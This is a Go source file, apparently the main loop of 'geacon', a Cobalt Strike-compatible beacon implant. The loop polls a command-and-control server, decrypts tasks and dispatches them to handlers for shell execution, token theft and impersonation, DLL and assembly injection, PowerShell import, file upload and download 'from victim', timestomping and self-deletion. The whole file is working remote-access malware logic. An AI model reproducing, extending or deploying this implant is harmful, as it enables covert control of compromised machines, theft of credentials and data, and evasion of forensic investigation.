package main

import (
	"bytes"
	"encoding/binary"
	"main/command"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"math/rand"
	"time"
)

func main() {
	// set rand seed at beginning of the program
	currentTime := time.Now()
	rand.Seed(currentTime.UnixNano())
	command.TimeCheck(currentTime)
	ok := packet.FirstBlood()
	if ok {
		for {
			currentTime = time.Now()
			command.TimeCheck(currentTime)
			resp, err := packet.PullCommand()
			if err == nil {
				totalLen := len(resp)
				if totalLen > 0 {
					// end with 16 byte
					respByte := resp
					// hmacHash, useless
					_ = respByte[totalLen-util.HmacHashLen:]
					//util.Printf("hmac hash: %v\n", hmacHash)
					// TODO check the hmachash
					restBytes := respByte[:totalLen-util.HmacHashLen]
					decrypted := packet.DecryptPacket(restBytes)
					// first 4 bytes timestamp,useless
					_ = decrypted[:4]
					//util.Printf("timestamp: %v\n", timestamp)
					// 4 bytes data length
					lenBytes := decrypted[4:8]
					packetLen := binary.BigEndian.Uint32(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
						if cmdBuf != nil {
							util.Printf("Cmd type %d\n", cmdType)
							if len(cmdBuf) > 100 {
								util.Printf("Cmd buffer: %s\n", cmdBuf[:100])
								util.Printf("Cmd buffer bytes: %v\n", cmdBuf[:100])
							} else {
								util.Printf("Cmd buffer: %s\n", cmdBuf)
								util.Printf("Cmd buffer bytes: %v\n", cmdBuf)
							}
							var execErr error
							execErr = nil
							// replyType can be found at beacon.BeaconC2 process_beacon_callback_decrypted
							// it seems use CALLBACK_OUTPUT can solve chinese garbled, and utf8 can not
							switch cmdType {
							case command.CMD_TYPE_CHECKIN:
								_, execErr = packet.PullCommand()
							case command.CMD_TYPE_SHELL:
								execErr = command.Run(cmdBuf)
							case command.CMD_TYPE_EXECUTE:
								execErr = command.Exec(cmdBuf)
							case command.CMD_TYPE_RUNAS:
								execErr = command.RunAs(cmdBuf)
							case command.CMD_TYPE_GET_PRIVS:
								execErr = command.GetPrivsByte(cmdBuf)
							case command.CMD_TYPE_REV2SELF:
								execErr = command.Rev2self()
							case command.CMD_TYPE_STEAL_TOKEN:
								execErr = command.StealToken(cmdBuf)
							case command.CMD_TYPE_MAKE_TOKEN:
								execErr = command.MakeToken(cmdBuf)
							case command.CMD_TYPE_SPAWN_TOKEN_X64:
								execErr = command.SpawnAndInjectDll(cmdBuf, true, false)
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
								execErr = command.SpawnAndInjectDll(cmdBuf, true, true)
							case command.CMD_TYPE_SPAWN_TOKEN_X86:
								execErr = command.SpawnAndInjectDll(cmdBuf, false, false)
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
								execErr = command.SpawnAndInjectDll(cmdBuf, false, true)
							case command.CMD_TYPE_INJECT_X86:
								execErr = command.InjectDll(cmdBuf, false)
							case command.CMD_TYPE_INJECT_X64:
								execErr = command.InjectDll(cmdBuf, true)
							case command.CMD_TYPE_EXEC_ASM_TOKEN_X86:
								execErr = command.ExecAsm(cmdBuf, false, false)
							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X86:
								execErr = command.ExecAsm(cmdBuf, false, true)
							case command.CMD_TYPE_EXEC_ASM_TOKEN_X64:
								execErr = command.ExecAsm(cmdBuf, true, false)
							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64:
								execErr = command.ExecAsm(cmdBuf, true, true)
							case command.CMD_TYPE_UNKNOWN_JOB:
								// seems same as 40, need to check.
								fallthrough
							case command.CMD_TYPE_JOB:
								execErr = command.HandlerJobAsync(cmdBuf)
							case command.CMD_TYPE_LIST_JOBS:
								execErr = command.ListJobs()
							case command.CMD_TYPE_JOBKILL:
								execErr = command.KillJob(cmdBuf)
							case command.CMD_TYPE_IMPORT_PS:
								command.PowershellImport(cmdBuf)
							case command.CMD_TYPE_WEB_DELIVERY:
								command.WebDelivery(cmdBuf)
							case command.CMD_TYPE_GET_UID:
								packet.PushResult(packet.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
							// even there is a CALLBACK_PROCESS_LIST, but still use PENDING
							case command.CMD_TYPE_PS:
								execErr = command.ListProcess(cmdBuf)
							case command.CMD_TYPE_KILL:
								execErr = command.KillProcess(cmdBuf)
							case command.CMD_TYPE_DRIVES:
								execErr = command.ListDrives(cmdBuf)
							case command.CMD_TYPE_REMOVE:
								execErr = command.Remove(string(cmdBuf))
							case command.CMD_TYPE_FILE_COPY:
								execErr = command.CopyFile(cmdBuf)
							case command.CMD_TYPE_FILE_MOVE:
								execErr = command.MoveFile(cmdBuf)
							case command.CMD_TYPE_TIMESTOMP:
								execErr = command.TimeStomp(cmdBuf)
							// UPLOAD_START and UPLOAD_LOOP is same
							case command.CMD_TYPE_UPLOAD_START:
								execErr = command.Upload(cmdBuf, true)
							case command.CMD_TYPE_UPLOAD_LOOP:
								execErr = command.Upload(cmdBuf, false)
							// download file from victim
							case command.CMD_TYPE_DOWNLOAD:
								execErr = command.Download(cmdBuf)
							case command.CMD_TYPE_FILE_BROWSE:
								execErr = command.FileBrowse(cmdBuf)
							case command.CMD_TYPE_CD:
								execErr = command.ChangeCurrentDir(cmdBuf)
							case command.CMD_TYPE_MAKEDIR:
								execErr = command.MakeDir(string(cmdBuf))
							case command.CMD_TYPE_SLEEP:
								command.ChangeSleep(cmdBuf)
							case command.CMD_TYPE_PAUSE:
								command.Pause(cmdBuf)
							case command.CMD_TYPE_PWD:
								execErr = command.GetCurrentDirectory()
							case command.CMD_TYPE_LIST_NETWORK:
								execErr = command.GetNetworkInformation(cmdBuf)
							case command.CMD_TYPE_EXIT:
								packet.PushResult(packet.CALLBACK_DEAD, []byte("exit"))
								command.DeleteSelf()
								return
							default:
								errMsg := util.Sprintf("command type %d is not support by geacon now", cmdType)
								packet.ErrorMessage(errMsg)
							}
							if execErr != nil {
								packet.ErrorMessage(execErr.Error())
							}
						}
					}
				}
			}
			// after cmd finish
			//command.CheckDownload()
			command.Sleep()
		}
	}

}
